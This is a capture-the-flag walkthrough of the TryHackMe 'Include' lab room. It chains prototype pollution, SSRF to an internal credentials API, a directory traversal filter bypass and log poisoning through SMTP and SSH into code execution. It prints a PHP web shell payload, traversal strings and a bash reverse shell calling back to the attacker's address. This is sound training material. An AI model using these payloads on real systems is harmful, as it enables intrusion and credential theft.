---
title: 'TryHackMe: Include'
author: jaxafed
categories: [TryHackMe]
tags: [web, api, prototype pollution, ssrf, lfi, log poisoning]
render_with_liquid: false
media_subpath: /images/tryhackme_include/
image:
  path: room_image.webp
---

Include was a room about server-side web application vulnerabilities. First, we use a prototype pollution vulnerability to gain admin access on a web application and discover an internal API. Using a SSRF vulnerability on an endpoint (we also gain access by becoming an admin), we are able to reach this API and get the admin credentials for another web application. Logging in to this other application as admin, we managed to get code execution on the system by using log poisoning on a local file inclusion vulnerability after bypassing a directory traversal filter.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/include){: .center }

## Initial Enumeration

### Nmap Scan

```console
Nmap scan report for 10.10.202.40
Host is up (0.098s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0b:8f:6c:5a:7f:c3:a5:aa:9a:71:e6:b5:e5:c3:9c:c5 (RSA)
|   256 d1:9e:c0:e5:93:c4:a1:5e:df:12:da:9e:aa:a7:8b:7b (ECDSA)
|_  256 8d:6d:55:b9:62:36:3c:45:8c:51:7c:93:6b:67:46:61 (ED25519)
25/tcp    open  smtp     Postfix smtpd
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
110/tcp   open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: UIDL RESP-CODES STLS CAPA SASL AUTH-RESP-CODE TOP PIPELINING
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: OK more post-login have listed capabilities LOGINDISABLEDA0001 ID IMAP4rev1 LITERAL+ Pre-login STARTTLS LOGIN-REFERRALS ENABLE IDLE SASL-IR
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_imap-capabilities: OK more post-login have listed capabilities AUTH=PLAIN ID IMAP4rev1 LOGIN-REFERRALS Pre-login LITERAL+ AUTH=LOGINA0001 ENABLE IDLE SASL-IR
995/tcp   open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: UIDL RESP-CODES SASL(PLAIN LOGIN) CAPA USER AUTH-RESP-CODE TOP PIPELINING
4000/tcp  open  http     Node.js (Express middleware)
|_http-title: Sign In
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: System Monitoring Portal
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are many ports open.

- 22/SSH
- 25/SMTP
- 110/POP3
- 143/IMAP
- 993/SSL/IMAP
- 995/SSL/POP3
- 4000/HTTP
- 50000/HTTP

### Web 4000

Visiting `http://10.10.202.40:4000/`, we get a login page telling us to login with `guest:guest`.

![Web 4000 Login](port_4000_login.webp){: width="1200" height="600" }

After logging in with the given credentials, we get access to the application.

![Web 4000 Index](port_4000_index.webp){: width="1200" height="600" }

### Web 50000

At `http://10.10.202.40:50000/`, we find "System Monitoring Portal".

![Web 50000 Index](port_50000_index.webp){: width="1200" height="600" }

It also has a login page at `/login.php`.

![Web 50000 Login](port_50000_login.webp){: width="1200" height="600" }

## First Flag

### Prototype Pollution

Checking our profile at `http://10.10.202.40:4000/friend/1`, we see many properties attached to it, with one of them being `isAdmin: false`.

![Web 4000 Profile](port_4000_profile.webp){: width="1200" height="600" }

We are also able to recommend activities to the user.

![Web 4000 Recommend Activity](port_4000_recommend_activity.webp){: width="800" height="300" }

Recommended activities are added to our profile in the in the same way as any other property.

![Web 4000 Profile Properties](port_4000_profile_properties.webp){: width="800" height="300" }

We can try to use this to modify the `isAdmin` property.

![Web 4000 Prototype Pollution Payload](port_4000_prototype_pollution_payload.webp){: width="800" height="300" }

With the `activityType=isAdmin&activityName=test` payload, we manage to become an admin.

### Server Side Request Forgery

After becoming an admin, we get access to two more endpoints.

![Web 4000 Admin Header](port_4000_admin.webp){: width="1200" height="600" }

- `http://10.10.202.40:4000/admin/api`

It informs us about the existence of an internal API and the `http://127.0.0.1:5000/getAllAdmins101099991` endpoint where we can get the admin credentials.

![Web 4000 Admin API](port_4000_admin_api.webp){: width="1200" height="600" }

- `http://10.10.202.40:4000/admin/settings`

It allows us to update the banner image by giving a URL.

![Web 4000 Admin Setting](port_4000_admin_settings.webp){: width="1200" height="600" }

Testing it with our own server, we can see that it requests the page and returns the contents of it in base64 encoding.

![Web 4000 Admin Setting Test](port_4000_admin_settings_test.webp){: width="800" height="400" }

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.202.40 - - [01/Jun/2024 10:37:42] "GET /test HTTP/1.1" 200 -
```
![Web 4000 Admin Setting Test Result](port_4000_admin_settings_test_result.webp){: width="800" height="400" }

```console
$ curl -s 'http://10.11.72.22/test'
testing

$ echo 'dGVzdGluZwo=' | base64 -d
testing
```

We can use this `SSRF` vulnerability to reach the internal API and get the admin credentials.

![Web 4000 Admin Setting API](port_4000_admin_settings_api.webp){: width="800" height="400" }

![Web 4000 Admin Setting API Result](port_4000_admin_settings_api_result.webp){: width="800" height="400" }

Decoding the response we got from base64, we get the admin credentials.

```console
$ echo 'eyJS...FVIn0=' | base64 -d | jq
{
  "ReviewAppUsername": "admin",
  "ReviewAppPassword": "admin@!!!",
  "SysMonAppUsername": "administrator",
  "SysMonAppPassword": "[REDACTED]"
}
```

Using the `SysMonApp` credentials to login to the `System Monitoring Portal` at `http://10.10.202.40:50000/login.php`, we get our first flag.

![Web 50000 Dashboard](port_50000_dashboard.webp){: width="1200" height="600" }

## Second Flag

### Local File Inclusion

Checking the source code for `dashboard.php`, one interesting thing that stands out is how the profile picture is included via `profile.php?img=profile.png`.

> ```<img src="profile.php?img=profile.png" class="img-fluid rounded-circle mb-3 profile-pic" alt="User Profile Picture">```

Trying a simple directory traversal payload like this: `/profile.php?img=../profile.png`, we still get the `profile.png`. This means the server is probably replacing the `../` and our input ends up as just `profile.png`.

![Web 50000 Directory Traversal Payload One](port_50000_directory_traversal_payload1.webp){: width="1000" height="300" }

Trying `....//` as the payload (after the server replaces the `../`, we still end up with `../`), we get the same result.

- `....//` -> `..[../]/` -> `../`

![Web 50000 Directory Traversal Payload Two](port_50000_directory_traversal_payload2.webp){: width="1000" height="300" }

So, the server must be replacing the `../` in input at least two times. Trying `......///` as the payload (that will end up as `../` after two replacements), we no longer get the `profile.png`.

- `......///` -> `....[../]//` -> `....//` -> `..[../]/` -> `../`

![Web 50000 Directory Traversal Payload Three](port_50000_directory_traversal_payload3.webp){: width="1000" height="300" }

We can confirm that our directory traversal payload works by trying to read the `/etc/passwd` file.

![Web 50000 Directory Traversal Payload Success](port_50000_directory_traversal_success.webp){: width="1000" height="300" }

### Log Poisoning to RCE

Now that we are able to include any local files, we can look for any log files we can poison to include.

At this point, there are two logs we can both include and poison. I will show how to abuse both.

- `/var/log/mail.log`
- `/var/log/auth.log` 

We are able to include the `/var/log/mail.log` file.

![Web 50000 Directory Traversal Payload Auth Log](port_50000_directory_traversal_mail_log.webp){: width="1000" height="300" }

Since the SMTP service is running, we can poison this log file.

To poison the log, we need to try to send a mail with our PHP code payload as an address, and it will be logged as an invalid address received. 

We can use telnet for this.

```console
$ telnet 10.10.202.40 25
Trying 10.10.202.40...
Connected to 10.10.202.40.
Escape character is '^]'.
220 mail.filepath.lab ESMTP Postfix (Ubuntu)
helo ok
250 mail.filepath.lab
mail from: <?php system($_GET["cmd"]); ?>
501 5.1.7 Bad sender address syntax
quit
221 2.0.0 Bye
Connection closed by foreign host.
```

After this, we can see that we were successful at poisoning the log, and we can use this to run commands on the system.

![Web 50000 Directory Traversal Payload Mail Log Test](port_50000_directory_traversal_mail_log_test.webp){: width="1000" height="500" }

Now, we can use a reverse shell payload like so: `bash -c 'bash -i >& /dev/tcp/10.11.72.22/443 0>&1'` to get a shell on the system with the request:

- `/profile.php?img=......///......///......///......///var/log/mail.log&cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E11%2E72%2E22%2F443%200%3E%261%27`

<br>

---

We are also able to include the `/var/log/auth.log` file.

![Web 50000 Directory Traversal Payload Auth Log](port_50000_directory_traversal_auth_log.webp){: width="1000" height="300" }

Any user that attempts to `SSH`, will be logged to this file. We can see this by trying to SSH as `test`.

```console
$ ssh test@10.10.202.40
```

![Web 50000 Directory Traversal Payload Auth Log Test](port_50000_directory_traversal_auth_log_test.webp){: width="1000" height="500" }

Now to poison this log file, we just need to try to login with a username as PHP code: `<?php system($_GET["cmd"]); ?>`.

If you look for ways to do this online, you will probably come across this method: `ssh '<?php system($_GET["cmd"]); ?>'@10.10.202.40`.

But this will no longer work due to an update to `OpenSSH`.

```console
$ ssh '<?php system($_GET["cmd"]); ?>'@10.10.202.40
remote username contains invalid characters
```

We can side-step this issue by using `hydra`.

```console
$ hydra -l '<?php system($_GET["cmd"]); ?>' -p test ssh://10.10.202.40
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-01 12:15:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://10.10.202.40:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-01 12:15:17
```

After running the `hydra` command, we can see that we were once again successful at poisoning the log and can use it to run commands on the system.

![Web 50000 Directory Traversal RCE](port_50000_directory_traversal_rce.webp){: width="1000" height="300" }

We can use the same payload as before to get a shell with a request like this:

- `/profile.php?img=......///......///......///......///var/log/auth.log&cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E11%2E72%2E22%2F443%200%3E%261%27`

After getting a shell, we can read the text file at `/var/www/html` to get the second flag and complete the room.

```console
www-data@filepath:/var/www/html$ cat 5*.txt
THM{[REDACTED]}
```

## Beyond Root

### Directory Traversal Filter

Now that we have a shell, we are able to read the `profile.php` to see how the directory traversal filter exactly works.

```php
<?php
session_start();

if (!isset($_SESSION['username'])) {
    header('Location: login.php');
    exit();
}

if(!empty($_GET['img'])){
    $file = $_GET['img'];
    $file = str_replace('../', '', $file);

    $file = preg_replace('/\.\.\//', '', $file, 5);
    $filePath = 'uploads/' . $file;

    if (strpos($filePath, 'uploads/') === 0) {
        @include($filePath);
    }
} else {
    echo "No data received.";
}
?>
```
{: file="profile.php" }

First, it replaces every instance of `../` on the input with: `$file = str_replace('../', '', $file);`

Then it replaces only the first five instances of `../` with: `$file = preg_replace('/\.\.\//', '', $file, 5);`

So, a payload like this `/profile.php?img=....//....//....//....//....//....//....//....//....//etc/passwd` would also work.

- `....//....//....//....//....//....//....//....//....//etc/passwd`
- `..[../]/..[../]/..[../]/..[../]/..[../]/..[../]/..[../]/..[../]/..[../]/etc/passwd` # str_replace
- `../../../../../../../../../etc/passwd`
- `[../][../][../][../][../]../../../../etc/passwd` # preg_replace
- `../../../../etc/passwd`

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>